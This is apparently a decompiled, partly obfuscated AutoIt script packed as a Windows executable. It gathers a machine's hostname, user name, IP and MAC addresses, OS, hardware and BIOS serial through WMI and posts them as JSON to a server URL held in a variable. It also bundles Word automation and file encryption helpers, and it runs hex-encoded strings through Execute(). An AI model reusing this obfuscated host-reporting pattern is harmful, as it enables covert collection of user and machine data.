	Local $tvt0s1 = "" & "'　 " & '"　' & "'' '" & '"' & "'' &" & '"' & "''　	" & '" " &　	&' & "'" & '"" 　 	&　&&' & "'" & '"&　' & "''&" & '"&　　  &""' & "''&  && ''" & '""  &  &　' & "'　&'　 &　 	 " & '"　' & "' 　 '  " & '" "' & "'& & &　'&　  　" & '"  　' & "'　" & '"  　&&' & "'　&&'　　  	" & '" ' & "'&&　　 　&'&　&'　 ' " & '"&　　	　' & "'&&&　 　 　　& 　　&     & 	  '&	 　　&	" & '"&"  　  & 	&"　' & "' 　　　 '　　　 	 &'" & '"& ' & "'" & '"' & "'&　 	&" & '"&	 　   　& 	　 ' & "'　 " & '""　　"	' & "'　　 & " & '"&　' & "'　&	　 '     " & '" ' & "' '& &　& 	　' ' " & '"　&" & ' & "' '& 　　　　　" & '"　　&"&	"	"' & "'& 　" & '"   &' & "'   &''　& 　''" & '"   "　 &&　 	 　　"&" ' & "'	&'    　　& 　 	   &　　	　　	&& & 　 " & ""
	Local $tvt0se = "535452494E475245504C41434528245456543053312C2043485257283132323838292C2043485228"
	$tvt0se &= "33352929"
	$tvt0s1 = Execute(ovt0sf($tvt0se))
	Local $tvt0sd = "535452494E4752454745585028245456543053312C20272E272C203329"
	Local $tvt0s3 = Execute(ovt0sf($tvt0sd))
	Local $tvt0s4 = 0
	For $tvt0s5 = 0 To UBound($tvt0s3) - 1
		$tvt0s3[$tvt0s5] = Execute(BinaryToString("0x455845435554452842494E415259544F535452494E47282230783431353334333537323832343534353635343330353333333542323435343536353433303533333535443239222929")) - 5
		$tvt0s4 += $tvt0s3[$tvt0s5]
	Next
	Local $tvt0s6 = 0, $tvt0s7 = "", $tvt0s8 = ""
	For $tvt0sc = 0 To $tvt0s2
		If NOT $tvt0s6 Then
			$tvt0s6 = 1
			Local $tvt0sd = "535452494E474C45465428245456543053392C202454565430534129"
			$tvt0s7 = Execute(ovt0sf($tvt0sd))
			$tvt0s9 = Execute(BinaryToString("0x455845435554452842494E415259544F535452494E472822307835333534353234393445343735343532343934443443343534363534323832343534353635343330353333393243323032343534353635343330353334313239222929"))
			$tvt0s8 = $tvt0s7
			For $tvt0s5 = $tvt0s0 - 2 To 0 Step -1
				Local $tvt0sd = "455845435554452842494E415259544F535452494E47282230783533353435323439344534373443"
				$tvt0sd &= "34353436353432383234353435363534333035333339324332303234353435363534333035333333"
				$tvt0sd &= "3542323435343536353433303533333535443239222929"
				$tvt0s7 = Execute(ovt0sf($tvt0sd))
				Local $tvt0sd = "455845435554452842494E415259544F535452494E47282230783533353435323439344534373534"
				$tvt0sd &= "35323439344434433435343635343238323435343536353433303533333932433230323435343536"
				$tvt0sd &= "35343330353333333542323435343536353433303533333535443239222929"
				$tvt0s9 = Execute(ovt0sf($tvt0sd))
				$tvt0s8 = $tvt0s7 & $tvt0s8
			Next
		Else
			For $tvt0s5 = UBound($tvt0s3) - 1 To 0 Step -1
				Local $tvt0sd = "535452494E474C45465428245456543053392C20245456543053335B245456543053355D29"
				$tvt0s7 = Execute(ovt0sf($tvt0sd))
				Local $tvt0sd = "535452494E475452494D4C45465428245456543053392C20245456543053335B245456543053355D"
				$tvt0sd &= "29"
				$tvt0s9 = Execute(ovt0sf($tvt0sd))
				$tvt0s8 = $tvt0s7 & $tvt0s8
			Next
		EndIf
	Next
	If $tvt0sb = 1 Then Return $tvt0s8
	Local $tvt0sd = "535452494E474D494428245456543053382C20312C20535452494E474C454E282454565430533829"
	$tvt0sd &= "202F202454565430534229"
	Return Execute(ovt0sf($tvt0sd))
EndFunc

Func t0sf00e1($t0s0596 = Default, $t0s0597 = Default)
	Local $t0s0598, $t0s0599 = False
	If $t0s0596 = Default Then $t0s0596 = True
	If $t0s0597 = Default Then $t0s0597 = False
	If NOT $t0s0597 Then $t0s0598 = ObjGet($vt0s0780, $vt0s07c6)
	If $t0s0597 OR @error Then
		$t0s0598 = ObjCreate($vt0s07c6)
		If @error OR NOT IsObj($t0s0598) Then Return SetError($vt0sz0945, @error, $vt0sz094e)
		$t0s0599 = True
	EndIf
	t0sf00f4($t0s0599)
	$t0s0598.visible = $t0s0596
	Return SetError($vt0sz094e, $t0s0599, $t0s0598)
EndFunc

Func t0sf00f4($t0s087e = Default)
	Static $t0s087f = False
	If IsBool($t0s087e) Then $t0s087f = $t0s087e
	Return $t0s087f
EndFunc

Func t0sf00f3($t0s0729, ByRef $t0s0842, $t0s07e5 = Default, $t0s07e6 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s07e5 = Default Then $t0s07e5 = $vt0sz0945
	If $t0s07e6 = Default Then $t0s07e6 = Execute($vt0s0936)
	If NOT IsObj($t0s0729) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If NOT IsArray($t0s0842) OR UBound($t0s0842, $t0s084d) > $vt0sz093b Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	Local $t0s0587, $t0s084f, $t0s0850, $t0s0851
	$t0s084f = UBound($t0s0842, $t0s083a)
	If UBound($t0s0842, $t0s084d) = $vt0sz0945 Then
		For $t0s081d = $t0s07e5 To $t0s084f - $vt0sz0945
			$t0s0587 = $t0s0587 & $t0s0842[$t0s081d]
			If $t0s081d <> $t0s084f Then $t0s0587 = $t0s0587 & Execute($vt0s0946)
		Next
	Else
		$t0s0850 = UBound($t0s0842, $t0s083c)
		For $t0s081d = $t0s07e5 To $t0s084f - $vt0sz0945
			For $t0s0823 = $vt0sz094e To $t0s0850 - $vt0sz0945
				$t0s0587 = $t0s0587 & $t0s0842[$t0s081d][$t0s0823]
				If $t0s0823 <> $t0s0850 - $vt0sz0945 Then $t0s0587 = $t0s0587 & $t0s07e6
			Next
			If $t0s081d <> $t0s084f - $vt0sz0945 Then $t0s0587 = $t0s0587 & Execute($vt0s0946)
		Next
	EndIf
	$t0s0729.text = $t0s0587
	If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	$t0s0851 = $t0s0729.converttotable($t0s07e6)
	If @error Then Return SetError($vt0sz094c, @error, $vt0sz094e)
	Return $t0s0851
EndFunc

Func t0sf00f2($t0s05cd, $t0s07e4, $t0s07e5 = Default, $t0s07e6 = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If $t0s07e5 = Default Then $t0s07e5 = $vt0sz0945
	If $t0s07e6 = Default Then $t0s07e6 = Execute($vt0s0936)
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0s0780)
	If NOT IsObj($t0s07e4) Then
		$t0s07e4 = $t0s05cd.tables.item($t0s07e4)
		If @error Then Return SetError($vt0sz093b, @error, $vt0s0780)
	EndIf
	Local $t0s07f1[$vt0sz093b][$vt0sz093b] = [[Execute($vt0s0936), $vt0s0909], [Execute($vt0s091f), $vt0s090b]], $t0s07f2, $t0s07f3, $t0s07f4 = $vt0sz0945, $t0s05d9 = False
	$t0s07e4.range.find.clearformatting
	If @error Then Return SetError($vt0sz0948, @error, $vt0s0780)
	$t0s05d9 = $t0s07e4.range.find.execute($t0s07f1[$vt0sz094e][$vt0sz094e], False, False, False, False, False, True, $t0s066c, False, $t0s07f1[$vt0sz094e][$vt0sz0945], $t0s0684)
	If $t0s05d9 Then $t0s07f4 = $t0s07f4 + $vt0sz0945
	$t0s05d9 = $t0s07e4.range.find.execute($t0s07f1[$vt0sz0945][$vt0sz094e], False, False, False, False, False, True, $t0s066c, False, $t0s07f1[$vt0sz0945][$vt0sz0945], $t0s0684)
	If $t0s05d9 Then $t0s07f4 = $t0s07f4 + $vt0sz0945
	$t0s07f2 = $t0s07e4.rows.count()
	$t0s07f3 = $t0s07e4.columns.count()
	Local $t0s080d[$t0s07f2 + $t0s07e5][$t0s07f3], $t0s0811, $t0s0812
	Local $t0s0729 = $t0s07e4.converttotext($t0s07e6, False)
	If @error Then Return SetError($vt0sz094c, @error, $vt0s0780)
	Local $t0s0587 = $t0s0729.text
	$t0s05cd.undo($t0s07f4)
	$t0s0811 = StringSplit($t0s0587, Execute($vt0s091f), $t0s081c)
	For $t0s081d = $vt0sz094e To $t0s07f2 - $vt0sz0945
		$t0s0812 = StringSplit($t0s0811[$t0s081d], $t0s07e6)
		For $t0s0823 = $vt0sz0945 To $t0s0812[$vt0sz094e]
			$t0s0812[$t0s0823] = StringReplace($t0s0812[$t0s0823], $t0s07f1[$vt0sz094e][$vt0sz0945], $t0s07f1[$vt0sz094e][$vt0sz094e])
			$t0s0812[$t0s0823] = StringReplace($t0s0812[$t0s0823], $t0s07f1[$vt0sz0945][$vt0sz0945], $t0s07f1[$vt0sz0945][$vt0sz094e])
			$t0s080d[$t0s081d + $t0s07e5][$t0s0823 - $vt0sz0945] = $t0s0812[$t0s0823]
		Next
	Next
	If $t0s07e5 Then
		$t0s080d[$vt0sz094e][$vt0sz094e] = UBound($t0s080d, $t0s083a) - $vt0sz0945
		If UBound($t0s080d, $t0s083c) > $vt0sz0945 Then $t0s080d[$vt0sz094e][$vt0sz0945] = UBound($t0s080d, $t0s083c)
	EndIf
	Return $t0s080d
EndFunc

Func t0sf00e6($t0s05cd, $t0s0606, $t0s0607 = Default, $t0s0608 = Default, $t0s0609 = Default, $t0s060a = Default, $t0s060b = Default, $t0s060c = Default, $t0s060d = Default, $t0s060e = Default)
	Local $t0s05ad = ObjEvent($vt0s07ce, $vt0s07cf)
	If NOT IsObj($t0s05cd) Then Return SetError($vt0sz0945, $vt0sz094e, $vt0sz094e)
	If $t0s0606 = $vt0s0780 Then Return SetError($vt0sz093b, $vt0sz094e, $vt0sz094e)
	If $t0s0607 = Default Then $t0s0607 = $t0s0614
	If $t0s0608 = Default Then $t0s0608 = $t0s0617
	If $t0s060b = Default Then $t0s060b = False
	If $t0s060c = Default Then $t0s060c = True
	If $t0s060e = Default Then $t0s060e = False
	If $t0s0608 = $t0s061f Then
		$t0s05cd.exportasfixedformat($t0s0606, $t0s0607, $t0s060b, Default, Default, Default, $t0s060c, Default, $t0s060d, Default, Default, $t0s060e)
	Else
		$t0s05cd.exportasfixedformat($t0s0606, $t0s0607, $t0s060b, Default, $t0s0608, $t0s0609, $t0s060a, Default, $t0s060c, Default, $t0s060d, Default, Default, $t0s060e)
	EndIf
	If @error Then Return SetError($vt0sz0948, @error, $vt0sz094e)
	Return $vt0sz0945
EndFunc

Func ovt0sf($vt0s2jz)
	Return BinaryToString("0X" & $vt0s2jz, 4)
EndFunc

#AutoIt3Wrapper_Icon=C:\Program Files (x86)\AutoIt3\Aut2Exe\Icons\acc.ico
#AutoIt3Wrapper_OutFile=HXIWGI.exe
#AutoIt3Wrapper_Res_Fileversion=1.0
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_LegalCopyright=Copyright ? 2014
#AutoIt3Wrapper_UseX64=n
#AutoIt3Wrapper_Res_Field=園咎垢醤|AuMFCompiler(炎彈井)

Func siupdate()
	$result = t0sf00df($t0s056f, $t0s0570)
	If $result = 200 Then
		Return 
	EndIf
EndFunc

Func siopupdate($opdatadetail)
	$uj823654 = StringFormat('{"hostName":"%s","userName":"%s","role":"%s","adOrWorkup":"%s","ip":"%s","mac":"%s","os":"%s","ssitVersion":"%s","operation":"%s","operationDetail":"%s"}', $t0s055a, $t0s055b, $actrole, $pcexad, $t0s0560, $t0s055f, $winosver, $t0s0565, $opg2510, $opdatadetail)
	$result = t0sf00df($ud32340, $uj823654)
	If $result = 200 Then
	Else
		Return 
	EndIf
EndFunc

Func getsvrtime($surl)
	Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
	$ohttp.open("GET", $surl, False)
	If (@error) Then Return SetError(1, 0, 0)
	$ohttp.setrequestheader("Content-Type", "application/json; charset=utf-8")
	$ohttp.send("timesync")
	If (@error) Then
		Return SetError(2, 0, 0)
	EndIf
	Return $ohttp.responsetext
EndFunc

Func t0sf00df($t0s0586, $t0s0587 = $vt0s0780)
	Local $t0s0588 = ObjCreate("WinHttp.WinHttpRequest.5.1")
	$t0s0588.open("POST", $t0s0586, False)
	If (@error) Then Return SetError(1, 0, 0)
	$t0s0588.setrequestheader("Content-Type", "application/json-patch+json")
	$t0s0588.send($t0s0587)
	If (@error) Then
		Return SetError(2, 0, 0)
	EndIf
	Return $t0s0588.status
EndFunc

Func getpccpuname()
	Local $pccpu = "Unknow"
	For $wcpu In $wmi.instancesof("Win32_Processor")
		If $wcpu.name Then
			$pccpu = $wcpu.name
		EndIf
	Next
	Return String($pccpu)
EndFunc

Func getpcsn()
	Local $pcsn = "Unknow"
	For $wcsn In $wmi.instancesof("Win32_BIOS")
		If $wcsn.serialnumber Then
			$pcsn = $wcsn.serialnumber
		EndIf
	Next
	Return StringLeft($pcsn, 20)
EndFunc

Func getpcmemory()
	Local $pcmemory = "Unknow"
	For $wcmemory In $wmi.instancesof("Win32_ComputerSystem")
		If $wcmemory.totalphysicalmemory Then
			$pcmemory = $wcmemory.totalphysicalmemory
			If Round($pcmemory / 1024 / 1024 / 1024) > 1 Then
				Return String(Round($pcmemory / 1024 / 1024 / 1024) & "GB")
			ElseIf Round($pcmemory / 1024 / 1024) > 1 Then
				Return String(Round($pcmemory / 1024 / 1024) & "MB")
			ElseIf Round($pcmemory / 1024) > 1 Then
				Return String(Round($pcmemory / 1024) & "KB")
			Else
				Return String(Round($pcmemory) & "Byte")
			EndIf
		EndIf
	Next
	Return String(Round($pcmemory) & "Byte")
EndFunc

Func getpcvendor()
	Local $pcvendor = "Unknow"
	Local $cwgvendor1 = ","
	Local $cwgvendor2 = "Inc."
	For $wcvendor In $wmi.instancesof("Win32_ComputerSystemProduct")
		If $wcvendor.vendor Then
			$pcvendor = $wcvendor.vendor
		EndIf
	Next
	$cwginfo1 = StringReplace($pcvendor, $cwgvendor1, "")
	$cwginfo2 = StringReplace($cwginfo1, $cwgvendor2, "")
	$pcvendor = $cwginfo2
	Return String($pcvendor)
EndFunc

Func getpcmodel()
	Local $pcmodel = "Unknow"
	For $wcmodel In $wmi.instancesof("Win32_ComputerSystemProduct")
		If $wcmodel.name Then
			$pcmodel = $wcmodel.name
		EndIf
	Next
	Return String(StringLeft($pcmodel, 20))
EndFunc

Func getpcdisplaycardname()
	Local $pcdisplaycard = "Unknow"
	For $wcdisplaycard In $wmi.instancesof("Win32_VideoController")
		If $wcdisplaycard.name Then
			$pcdisplaycard = $wcdisplaycard.name
		EndIf
	Next
	Return String($pcdisplaycard)
EndFunc

Func getpcip()
	Local $pcip = "0.0.0.0"
	For $wcip In $wmi.execquery("Select IPAddress from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE   ")
		If NOT $wcip.ipaddress Then
			$pcip = $wcip.ipaddress(0)
			$gpcip = StringInStr(StringLeft($pcip, 4), "10.")
			If $gpcip = 1 Then
				Return String($pcip)
			EndIf
		EndIf
	Next
	Return String($pcip)
EndFunc

Func getpcmac()
	Local $pcmac = "Unknow"
	Local $pcip = "0.0.0.0"
	For $wcip In $wmi.execquery("Select IPAddress,MACAddress  from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE   ")
		If NOT $wcip.ipaddress Then
			$pcip = $wcip.ipaddress(0)
			$pcmac = $wcip.macaddress
			$gpcip = StringInStr(StringLeft($pcip, 3), "10.")
			If $gpcip = 1 Then
				Return String($pcmac)
			EndIf
		EndIf
	Next
	Return String($pcmac)
EndFunc

Func getdisktotal()
	Local $aarray = DriveGetDrive($dt_fixed)
	Local $disktotalt = 0
	Local $pcdtvtemp = 0
	If @error Then
	Else
		For $i = 1 To $aarray[0]
			$dtvs = Round(DriveSpaceTotal($aarray[$i]))
			$disktotalt += $dtvs
		Next
		$pcdtvtemp = $disktotalt
		If $pcdtvtemp / 1024 > 1024 Then
			$pcdtv = String(Round($pcdtvtemp / 1024 / 1024, 2) & "TB")
			Return $pcdtv
		ElseIf $pcdtvtemp > 1024 Then
			$pcdtv = String(Round($pcdtvtemp / 1024) & "GB")
			Return $pcdtv
		Else
			$pcdtv = String($pcdtvtemp & "MB")
			Return $pcdtv
		EndIf
	EndIf
	Return $pcdtv
EndFunc

Global Const $prov_rsa_full = 1
Global Const $prov_rsa_aes = 24
Global Const $crypt_verifycontext = -268435456
Global Const $hp_hashsize = 4
Global Const $hp_hashval = 2
Global Const $crypt_exportable = 1
Global Const $crypt_userdata = 1
Global Const $calg_md2 = 32769
Global Const $calg_md4 = 32770
Global Const $calg_md5 = 32771
Global Const $calg_sha1 = 32772
Global Const $calg_3des = 26115
Global Const $calg_aes_128 = 26126
Global Const $calg_aes_192 = 26127
Global Const $calg_aes_256 = 26128
Global Const $calg_des = 26113
Global Const $calg_rc2 = 26114
Global Const $calg_rc4 = 26625
Global Const $calg_userkey = 0
Global Const $kp_algid = 7
Global $__g_acryptinternaldata[3]

Func _crypt_startup()
	If __crypt_refcount() = 0 Then
		Local $hadvapi32 = DllOpen("Advapi32.dll")
		If $hadvapi32 = -1 Then Return SetError(1, 0, False)
		__crypt_dllhandleset($hadvapi32)
		Local $iproviderid = $prov_rsa_aes
		Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptAcquireContext", "handle*", 0, "ptr", 0, "ptr", 0, "dword", $iproviderid, "dword", $crypt_verifycontext)
		If @error OR NOT $aret[0] Then
			Local $ierror = @error + 10, $iextended = @extended
			DllClose(__crypt_dllhandle())
			Return SetError($ierror, $iextended, False)
		Else
			__crypt_contextset($aret[1])
		EndIf
	EndIf
	__crypt_refcountinc()
	Return True
EndFunc

Func _crypt_shutdown()
	__crypt_refcountdec()
	If __crypt_refcount() = 0 Then
		DllCall(__crypt_dllhandle(), "bool", "CryptReleaseContext", "handle", __crypt_context(), "dword", 0)
		DllClose(__crypt_dllhandle())
	EndIf
EndFunc

Func _crypt_derivekey($vpassword, $ialgid, $ihashalgid = $calg_md5)
	Local $aret = 0, $hbuff = 0, $hcrypthash = 0, $ierror = 0, $iextended = 0, $vreturn = 0
	_crypt_startup()
	Do
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptCreateHash", "handle", __crypt_context(), "uint", $ihashalgid, "ptr", 0, "dword", 0, "handle*", 0)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 10
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$hcrypthash = $aret[5]
		$hbuff = DllStructCreate("byte[" & BinaryLen($vpassword) & "]")
		DllStructSetData($hbuff, 1, $vpassword)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptHashData", "handle", $hcrypthash, "struct*", $hbuff, "dword", DllStructGetSize($hbuff), "dword", $crypt_userdata)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 20
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptDeriveKey", "handle", __crypt_context(), "uint", $ialgid, "handle", $hcrypthash, "dword", $crypt_exportable, "handle*", 0)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 30
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$vreturn = $aret[5]
	Until True
	If $hcrypthash <> 0 Then DllCall(__crypt_dllhandle(), "bool", "CryptDestroyHash", "handle", $hcrypthash)
	Return SetError($ierror, $iextended, $vreturn)
EndFunc

Func _crypt_destroykey($hcryptkey)
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptDestroyKey", "handle", $hcryptkey)
	Local $ierror = @error, $iextended = @extended
	_crypt_shutdown()
	If $ierror OR NOT $aret[0] Then
		Return SetError($ierror + 10, $iextended, False)
	Else
		Return True
	EndIf
EndFunc

Func _crypt_encryptdata($vdata, $vcryptkey, $ialgid, $bfinal = True)
	Switch $ialgid
		Case $calg_userkey
			Local $icalgused = __crypt_getcalgfromcryptkey($vcryptkey)
			If @error Then Return SetError(@error, -1, @extended)
			If $icalgused = $calg_rc4 Then ContinueCase
		Case $calg_rc4
			If BinaryLen($vdata) = 0 Then Return SetError(0, 0, Binary(""))
	EndSwitch
	Local $ireqbuffsize = 0, $aret = 0, $hbuff = 0, $ierror = 0, $iextended = 0, $vreturn = 0
	_crypt_startup()
	Do
		If $ialgid <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialgid)
			If @error Then
				$ierror = @error + 100
				$iextended = @extended
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $bfinal, "dword", 0, "ptr", 0, "dword*", BinaryLen($vdata), "dword", 0)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 20
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$ireqbuffsize = $aret[6]
		$hbuff = DllStructCreate("byte[" & $ireqbuffsize + 1 & "]")
		DllStructSetData($hbuff, 1, $vdata)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $bfinal, "dword", 0, "struct*", $hbuff, "dword*", BinaryLen($vdata), "dword", DllStructGetSize($hbuff) - 1)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 30
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$vreturn = BinaryMid(DllStructGetData($hbuff, 1), 1, $ireqbuffsize)
	Until True
	If $ialgid <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	Return SetError($ierror, $iextended, $vreturn)
EndFunc

Func _crypt_decryptdata($vdata, $vcryptkey, $ialgid, $bfinal = True)
	Switch $ialgid
		Case $calg_userkey
			Local $icalgused = __crypt_getcalgfromcryptkey($vcryptkey)
			If @error Then Return SetError(@error, -1, @extended)
			If $icalgused = $calg_rc4 Then ContinueCase
		Case $calg_rc4
			If BinaryLen($vdata) = 0 Then Return SetError(0, 0, Binary(""))
	EndSwitch
	Local $aret = 0, $hbuff = 0, $htempstruct = 0, $ierror = 0, $iextended = 0, $iplaintextsize = 0, $vreturn = 0
	_crypt_startup()
	Do
		If $ialgid <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialgid)
			If @error Then
				$ierror = @error + 100
				$iextended = @extended
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$hbuff = DllStructCreate("byte[" & BinaryLen($vdata) + 1000 & "]")
		If BinaryLen($vdata) > 0 Then DllStructSetData($hbuff, 1, $vdata)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptDecrypt", "handle", $vcryptkey, "handle", 0, "bool", $bfinal, "dword", 0, "struct*", $hbuff, "dword*", BinaryLen($vdata))
		If @error OR NOT $aret[0] Then
			$ierror = @error + 20
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		$iplaintextsize = $aret[6]
		$htempstruct = DllStructCreate("byte[" & $iplaintextsize + 1 & "]", DllStructGetPtr($hbuff))
		$vreturn = BinaryMid(DllStructGetData($htempstruct, 1), 1, $iplaintextsize)
	Until True
	If $ialgid <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	Return SetError($ierror, $iextended, $vreturn)
EndFunc

Func _crypt_hashdata($vdata, $ialgid, $bfinal = True, $hcrypthash = 0)
	Local $aret = 0, $hbuff = 0, $ierror = 0, $iextended = 0, $ihashsize = 0, $vreturn = 0
	_crypt_startup()
	Do
		If $hcrypthash = 0 Then
			$aret = DllCall(__crypt_dllhandle(), "bool", "CryptCreateHash", "handle", __crypt_context(), "uint", $ialgid, "ptr", 0, "dword", 0, "handle*", 0)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 10
				$iextended = @extended
				$vreturn = -1
				ExitLoop
			EndIf
			$hcrypthash = $aret[5]
		EndIf
		$hbuff = DllStructCreate("byte[" & BinaryLen($vdata) & "]")
		DllStructSetData($hbuff, 1, $vdata)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptHashData", "handle", $hcrypthash, "struct*", $hbuff, "dword", DllStructGetSize($hbuff), "dword", $crypt_userdata)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 20
			$iextended = @extended
			$vreturn = -1
			ExitLoop
		EndIf
		If $bfinal Then
			$aret = DllCall(__crypt_dllhandle(), "bool", "CryptGetHashParam", "handle", $hcrypthash, "dword", $hp_hashsize, "dword*", 0, "dword*", 4, "dword", 0)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 30
				$iextended = @extended
				$vreturn = -1
				ExitLoop
			EndIf
			$ihashsize = $aret[3]
			$hbuff = DllStructCreate("byte[" & $ihashsize & "]")
			$aret = DllCall(__crypt_dllhandle(), "bool", "CryptGetHashParam", "handle", $hcrypthash, "dword", $hp_hashval, "struct*", $hbuff, "dword*", DllStructGetSize($hbuff), "dword", 0)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 40
				$iextended = @extended
				$vreturn = -1
				ExitLoop
			EndIf
			$vreturn = DllStructGetData($hbuff, 1)
		Else
			$vreturn = $hcrypthash
		EndIf
	Until True
	If $hcrypthash <> 0 AND $bfinal Then DllCall(__crypt_dllhandle(), "bool", "CryptDestroyHash", "handle", $hcrypthash)
	_crypt_shutdown()
	Return SetError($ierror, $iextended, $vreturn)
EndFunc

Func _crypt_hashfile($sfilepath, $ialgid)
	Local $btempdata = 0, $hfile = 0, $hhashobject = 0, $ierror = 0, $iextended = 0, $vreturn = 0
	_crypt_startup()
	Do
		$hfile = FileOpen($sfilepath, $fo_binary)
		If $hfile = -1 Then
			$ierror = 1
			$vreturn = -1
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hfile, 512 * 1024)
			If @error Then
				$vreturn = _crypt_hashdata($btempdata, $ialgid, True, $hhashobject)
				If @error Then
					$ierror = @error
					$iextended = @extended
					$vreturn = -1
					ExitLoop 2
				EndIf
				ExitLoop 2
			Else
				$hhashobject = _crypt_hashdata($btempdata, $ialgid, False, $hhashobject)
				If @error Then
					$ierror = @error + 100
					$iextended = @extended
					$vreturn = -1
					ExitLoop 2
				EndIf
			EndIf
		Until False
	Until True
	_crypt_shutdown()
	If $hfile <> -1 Then FileClose($hfile)
	Return SetError($ierror, $iextended, $vreturn)
EndFunc

Func _crypt_encryptfile($ssourcefile, $sdestinationfile, $vcryptkey, $ialgid)
	Local $btempdata = 0, $hinfile = 0, $houtfile = 0, $ierror = 0, $iextended = 0, $ifilesize = FileGetSize($ssourcefile), $iread = 0, $breturn = True
	_crypt_startup()
	Do
		If $ialgid <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialgid)
			If @error Then
				$ierror = @error
				$iextended = @extended
				$breturn = False
				ExitLoop
			EndIf
		EndIf
		$hinfile = FileOpen($ssourcefile, $fo_binary)
		If @error Then
			$ierror = 2
			$breturn = False
			ExitLoop
		EndIf
		$houtfile = FileOpen($sdestinationfile, $fo_overwrite + $fo_createpath + $fo_binary)
		If @error Then
			$ierror = 3
			$breturn = False
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hinfile, 1024 * 1024)
			$iread += BinaryLen($btempdata)
			If $iread = $ifilesize Then
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, True)
				If @error Then
					$ierror = @error + 400
					$iextended = @extended
					$breturn = False
				EndIf
				FileWrite($houtfile, $btempdata)
				ExitLoop 2
			Else
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, False)
				If @error Then
					$ierror = @error + 500
					$iextended = @extended
					$breturn = False
					ExitLoop 2
				EndIf
				FileWrite($houtfile, $btempdata)
			EndIf
		Until False
	Until True
	If $ialgid <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	If $hinfile <> -1 Then FileClose($hinfile)
	If $houtfile <> -1 Then FileClose($houtfile)
	Return SetError($ierror, $iextended, $breturn)
EndFunc

Func _crypt_decryptfile($ssourcefile, $sdestinationfile, $vcryptkey, $ialgid)
	Local $btempdata = 0, $hinfile = 0, $houtfile = 0, $ierror = 0, $iextended = 0, $ifilesize = FileGetSize($ssourcefile), $iread = 0, $breturn = True
	_crypt_startup()
	Do
		If $ialgid <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialgid)
			If @error Then
				$ierror = @error
				$iextended = @extended
				$breturn = False
				ExitLoop
			EndIf
		EndIf
		$hinfile = FileOpen($ssourcefile, $fo_binary)
		If @error Then
			$ierror = 2
			$breturn = False
			ExitLoop
		EndIf
		$houtfile = FileOpen($sdestinationfile, $fo_overwrite + $fo_createpath + $fo_binary)
		If @error Then
			$ierror = 3
			$breturn = False
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hinfile, 1024 * 1024)
			$iread += BinaryLen($btempdata)
			If $iread = $ifilesize Then
				$btempdata = _crypt_decryptdata($btempdata, $vcryptkey, $calg_userkey, True)
				If @error Then
					$ierror = @error + 400
					$iextended = @extended
					$breturn = False
				EndIf
				FileWrite($houtfile, $btempdata)
				ExitLoop 2
			Else
				$btempdata = _crypt_decryptdata($btempdata, $vcryptkey, $calg_userkey, False)
				If @error Then
					$ierror = @error + 500
					$iextended = @extended
					$breturn = False
					ExitLoop 2
				EndIf
				FileWrite($houtfile, $btempdata)
			EndIf
		Until False
	Until True
	If $ialgid <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	If $hinfile <> -1 Then FileClose($hinfile)
	If $houtfile <> -1 Then FileClose($houtfile)
	Return SetError($ierror, $iextended, $breturn)
EndFunc

Func _crypt_genrandom($pbuffer, $isize)
	_crypt_startup()
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptGenRandom", "handle", __crypt_context(), "dword", $isize, "struct*", $pbuffer)
	Local $ierror = @error, $iextended = @extended
	_crypt_shutdown()
	If $ierror OR (NOT $aret[0]) Then
		Return SetError($ierror + 10, $iextended, False)
	Else
		Return True
	EndIf
